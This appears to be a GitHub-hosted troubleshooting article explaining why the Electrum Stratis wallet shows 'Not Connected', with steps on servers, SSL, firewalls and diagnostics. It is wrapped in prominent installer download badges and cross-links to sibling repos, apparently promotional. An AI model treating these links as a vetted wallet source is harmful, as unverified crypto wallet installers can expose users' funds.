![Electrum-Stratis](assets/banner-article.png)

# Why does Electrum Stratis say "Not Connected"?

<p align="center">Six words and a peer list</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

"Not Connected" means the wallet has not completed a handshake with any server, so it cannot read the chain. It is a peer problem, not a balance problem: nothing is wrong with the coins, the seed or the file. Electrum Stratis keeps a bundled server list, retries across it automatically, and shows the current connection state instead of leaving a blank screen.

## You'll see this if

<div align="center">

| What you see | What it means | Where to go |
|---|---|---|
| Red "Not Connected" and no height | No server answered the handshake | Step 2 |
| Reinstalling changed nothing | The install was never the problem | Step 3 |
| Every listed server fails | The list, the network path or a filter is blocking all of them | Steps 4 and 5 |
| A different wallet shows the same failure | The cause is on the machine or the network, not in the wallet | Step 5 |
| Connected, then dropped mid-session | A server went away; retry should recover without a restart | Step 1 |

</div>

The distinction that saves the most time: a wallet that has never connected and a wallet that connected and then dropped need different fixes, and the health panel tells you which one you have.

## Why it happens

A light wallet does not download the whole chain; it asks a server for the headers and the transactions that concern its own addresses. Until one server answers, the wallet has nothing to display and no height to show. The failure therefore sits somewhere between the application and a remote peer: the bundled list may not suit your network, a firewall or antivirus may be inspecting the connection, a proxy or VPN may be rewriting it, or the server itself may be unreachable.

It is worth separating this from a balance problem. A wallet with no peers shows zero because it cannot see anything, not because the coins moved. Fixing the connection usually restores the balance without any further action.

The wallet is well maintained - its network layer is built so that a failed server is a retry, not a dead end.

## Fix

1. **Read the health panel first.** It names the server in use, the latency, the height, the age of the last block and a plain-language state. That single panel distinguishes "never connected" from "connected and stale", and it is the difference between the next two steps.
2. **Let automatic selection retry, then test a specific server.** With automatic selection on, the wallet walks the bundled list. If it settles nowhere, open the node list in settings, probe the entries, and watch which one answers. A server that fails a probe will not serve the wallet either.
3. **Add a server you know is reachable.** The bundled list is a starting point, not a limit: servers can be added, removed, reordered and probed without editing a configuration file. A server that answers a probe in the list is a valid candidate even if it was not shipped with the build.
4. **Check the SSL setting deliberately.** The toggle exists, it has a secure default, and it displays a warning while disabled. If a connection only works with SSL off, that is a signal about the server or the network path, not a setting to leave permanently; note it and prefer a server that works with SSL on.
5. **Rule out the machine.** A firewall, an antivirus with TLS inspection, a VPN, a corporate proxy or a captive portal will block or rewrite the connection for every wallet on that machine. Test on another network - a phone hotspot is enough - and if the wallet connects there, the problem is local and none of the wallet's own settings will fix it.
6. **Export diagnostics if it still fails.** The diagnostics bundle records servers, handshake errors, height, operating system and version, with seed and keys redacted. It is the artifact that makes a support conversation possible instead of a guessing game.

Reinstalling is not on this list, and that is deliberate: a reinstall changes none of the six factors above.

## If that did not work

If the health panel never leaves "not connected" on any server, on any network, with SSL on and with the firewall briefly out of the way, then the remaining causes are narrow: a build that cannot run its network layer on that system, or a network that blocks the traffic entirely. Running the wallet with its verbose start flag shows why the application will not proceed, which is faster than trial and error.

If the wallet connects but the height stays old, that is a different problem: the peer is reachable but the chain view is not advancing. If what you doubt is the wallet file itself rather than the network, [the three Electrum Stratis backups](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md) explain what a file can and cannot contain. A stale reachable server looks like a working connection and behaves like no connection at all, and swapping to a server with a recent block is the fix.

Waiting is rarely the answer. A connection that has not established in a few minutes with a working internet connection will not establish on its own; the retry loop needs a different server or a different network path.

## Prevention

- Keep automatic selection on unless you have a reason to pin a server.
- Keep two or three servers you know respond, so a single failure is a switch rather than an outage.
- After any change to a firewall, VPN or antivirus, open the wallet once and confirm the connection.
- Update to the current release before troubleshooting a network problem; the network layer is one of the parts that changes.
- Keep a diagnostics export from a working session, so a broken one has something to compare against.

## FAQ

### I reinstalled and tried each of the two servers. Why is it still offline?

Because the bundled list is not the whole list, and a reinstall restores the same entries. Add a server that answers a probe, or test the same machine on another network; the fix is in the list or the network path, not in the installation.

### It does not connect to the network, and another wallet gives the same result. Is the wallet broken?

No. When two different wallets fail on the same machine, the common factor is the machine or the network: TLS inspection, a firewall rule, a VPN or a proxy. Test on a different network before changing anything in either wallet.

### Should I just wait for it to connect?

A few minutes of retry is reasonable; an hour is not. If the health panel shows no successful handshake and the last block age keeps growing, the wallet is not going to recover by itself and the next action is a different server or a different network.

### Does the connection affect my funds?

No. The coins are on the chain and the keys are on your machine; the connection only decides what the wallet can see. A wallet that cannot connect is blind, not broken, and restoring it on a working connection shows the same balance.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Why is my balance missing? Three causes](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md)
- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
- [The Qt wallet does not work with a seed](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/qt-wallet-has-no-seed.md)
